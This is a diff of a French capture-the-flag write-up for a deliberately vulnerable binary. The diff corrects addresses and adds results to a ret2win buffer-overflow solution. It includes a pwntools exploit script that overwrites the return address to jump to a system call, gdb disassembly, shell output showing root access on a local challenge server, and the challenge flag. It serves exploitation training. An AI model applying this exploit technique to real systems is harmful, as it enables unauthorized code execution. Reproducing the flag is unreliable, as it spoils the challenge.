@@ -35,7 +35,7 @@ $ checksec --file pwn_1
 Pas de canary : nous pouvons utiliser le buffer overflow pour rediriger le programme.
 Pas de PIE : nous pouvons avoir l'adresse de `win`.
 
-Nous sommes dans le cas d'un [ret2win](https://ir0nstone.gitbook.io/notes/binexp/stack/ret2win). Il faut réecrire par dessus l'adresse utiliser pour `return` dans le main, et rediriger le programme vers la fonction `win` pour obtenir un `shell`.
+Nous sommes dans le cas d'un [ret2win](https://ir0nstone.gitbook.io/notes/binexp/stack/ret2win). Il faut réecrire par dessus l'adresse utilisée pour `return` dans le main, et rediriger le programme vers la fonction `win` pour obtenir un `shell`.
 
 ## Analyse dynamique
 
@@ -75,14 +75,14 @@ p.interactive()
 [#0] Id 1, Name: "pwn_1", stopped 0x4011f1 in main (), reason: SIGSEGV
 ```
 
-Depuis Ghidra nous pouvons retrouver l'adresse de la function `win` : `0x00401156`.
+Depuis Ghidra nous pouvons retrouver l'adresse de la function `win` : `0x00401166`.
 
 ## Exploit
 
 ```python3
 from pwn import *
 
-system = 0x401156
+system = 0x00401166
 
 payload = b"".join([
     b"A"*18,
@@ -92,16 +92,14 @@ payload = b"".join([
 p = process("./pwn_1")
 p.send(payload+b"\n")
 p.recvuntil(b"adorable...\n")
+
 p.interactive()
 ```
 
 ```console
-$ python3 solve.py 
-[+] Starting local process './pwn_1': pid 47796
-Waiting for debugeur
+$ python3 ./solve.py 
+[+] Starting local process './pwn_1': pid 50733
 [*] Switching to interactive mode
-Vas-y, tape ton précieux mot de passe... si tu l'oses ! Voyons voir si tu arrives à te connecter ahaha
-Haha, tu as vraiment cru que quelque chose allait se passer ? Je t’ai dit que tu ne pouvais pas te connecter ! Continue d’essayer, c’est adorable...
 LOGGED IN
 
 User : Admin
@@ -113,7 +111,7 @@ $ 1
 Quoi ?! Comment es-tu arrivé ici ?! Je savais que j’aurais dû supprimer tout ça… Peu importe, je ne te laisserai pas aller plus loin !
 [*] Got EOF while reading in interactive
 $ 
-[*] Process './pwn_1' stopped with exit code -11 (SIGSEGV) (pid 47796)
+[*] Process './pwn_1' stopped with exit code -11 (SIGSEGV) (pid 50733)
 [*] Got EOF while sending in interactive
 ```
 
@@ -133,14 +131,16 @@ if (strcmp_return_code == 0) {
 Pour passer cette condition : `if (strcmp_return_code == 0) {`, il faut saisir `1`. Mais pour atteindre le shell, il faut que `user_input` soit vide : `if (user_input[0] == '\0') {`. Se sont des conditions insatisfiable. Plutôt que d'exécuter toute la fonction `win`, nous allons donc directement aller à l'exécution de `system` qui nous intéresse :
 
 ```gdb
-   0x00000000004011aa <+84>:	mov    edi,0x40232e
-   0x00000000004011af <+89>:	call   0x401040 <system@plt>
+   0x00000000004011c9 <+99>:	lea    rax,[rip+0xefe]
+   0x00000000004011d0 <+106>:	mov    rdi,rax
+   0x00000000004011d3 <+109>:	call   0x401040 <system@plt>
+
 ```
 
 ```python
 from pwn import *
 
-system = 0x4011aa
+system = 0x004011c9
 
 payload = b"".join([
     b"A"*18,
@@ -150,22 +150,26 @@ payload = b"".join([
 p = process("./pwn_1")
 p.send(payload+b"\n")
 p.recvuntil(b"adorable...\n")
+
 p.interactive()
 ```
 
 ```console
-$ python3 solve.py 
-[+] Starting local process './pwn_1': pid 48700
+$ python3 ./solve.py 
+[+] Starting local process './pwn_1': pid 51915
 [*] Switching to interactive mode
 $ whoami
 geoffrey
-$ exit
-[*] Got EOF while reading in interactive
-$ 
-[*] Process './pwn_1' stopped with exit code -7 (SIGBUS) (pid 48700)
-[*] Got EOF while sending in interactive
 ```
 
-Plus qu'à lancer sur le serveur :
+Plus qu'à lancer sur le serveur avec [ce script](./solve.py) :
 
-## TODO
+```console
+$ python3 ./solve.py 
+[+] Opening connection to localhost on port 6969: Done
+[*] Switching to interactive mode
+$ whoami
+root
+$ cat flag.txt
+LABO{uB!e0_VcDfiplquZS4gN}
+```
